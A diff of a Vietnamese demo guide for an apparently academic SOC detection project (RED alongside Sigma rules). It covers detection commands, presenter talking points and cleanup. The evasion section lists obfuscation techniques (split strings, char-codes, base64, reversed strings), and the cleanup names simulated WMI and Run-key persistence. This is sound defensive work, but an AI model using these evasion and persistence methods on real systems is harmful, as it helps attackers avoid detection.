+  --config config/powershell.yaml \
+  --events /tmp/ps_4104.jsonl \
+  --threshold 0.5 \
+  --method cosine \
+  --out /tmp/red_ps_alerts.jsonl
+
+jq -r 'select((.command_line // "") | test("RED_APT_DEMO")) | "\(.detection_score) | \(.top_rule) | \(.top_rule_sigma_filename)"' /tmp/red_ps_alerts.jsonl
 ```
 
 ---
 
-# Tra cứu chi tiết hơn
+## 15. Kỳ Vọng Khi Thuyết Trình
 
-| File | Chứa |
+### Nếu chạy `-Mode chain`
+
+Nói:
+
+> Mode chain là kịch bản APT tổng hợp. Một số bước dùng pattern canonical để
+> Sigma bắt được, một số bước có kỹ thuật né literal. Điểm cần chứng minh là
+> RED không thay Sigma, mà bổ sung lớp phát hiện cho các biến thể gần giống rule.
+
+Kỳ vọng:
+
+- Kibana Security Alerts có một số alert Sigma.
+- `red-alerts-*` có alert RED từ process/registry/powershell.
+- AI Agent có thể lấy RED alert để viết report tiếng Việt.
+
+### Nếu chạy `-Mode evasion`
+
+Nói:
+
+> Mode evasion giữ cùng ý đồ tấn công nhưng đổi cách biểu diễn keyword: shorthand,
+> split string, comment injection, char-code, base64, reverse string. Đây là ca
+> rule exact-match dễ miss, nhưng RED vẫn chấm suspicious nhờ vector hóa token và
+> cosine attribution.
+
+Kỳ vọng:
+
+- Một số Sigma literal rule có thể không fire.
+- Một số Sigma behavior rule vẫn có thể fire, nhất là WMI/DNS/PowerShell broad rules.
+- RED vẫn có alert và top rule gợi ý rule Sigma gần nhất.
+
+---
+
+## 16. Cleanup
+
+Script tự tạo cleanup job sau:
+
+```text
+SleepSeconds + 60 giây
+```
+
+Cleanup gồm:
+
+- Xóa `C:\Users\Public\xkj9_demo_<RunId>.exe`.
+- Xóa marker `mshta_marker_<RunId>.txt` nếu có.
+- Xóa registry Run/RunOnce có prefix `RED_APT_DEMO`.
+- Xóa WMI EventFilter, CommandLineEventConsumer và binding theo RunId.
+
+Nếu cần cleanup thủ công, dùng script cleanup riêng trong tài liệu demo present hoặc xóa theo marker `RED_APT_DEMO`.
+
+---
+
+## 17. Tài Liệu Liên Quan
+
+| File | Nội dung |
 |---|---|
-| `demo/RED_RULE_MAP.md` | Bảng tra 1,367 RED rule ↔ Sigma filename/UUID/title |
-| `demo/README.md` Section 11.2 | Mapping 7 phase × Sigma rule + taxonomy 1.4 |
-| `demo/README.md` Section 12.15 | Catalog expansion 146 → 1,367 explained |
-| `demo/QA_PREP.md` | 16 câu hỏi GVHD có thể hỏi |
-| `demo/SLIDES_OUTLINE.md` | Khung 15 slide defense |
+| `demo/apt_demo_scenario.ps1` | Script PowerShell chạy demo |
+| `demo/apt_demo_scenario_demo_present.md` | Checklist và lời thoại demo trước hội đồng |
+| `demo/README.md` | Hướng dẫn demo RED-AI SOC tổng thể |
+| `demo/RED_RULE_MAP.md` | Mapping RED rule với Sigma metadata |
+| `demo/QA_PREP.md` | Bộ câu hỏi có thể gặp khi bảo vệ |
+| `demo/SLIDES_OUTLINE.md` | Outline slide |
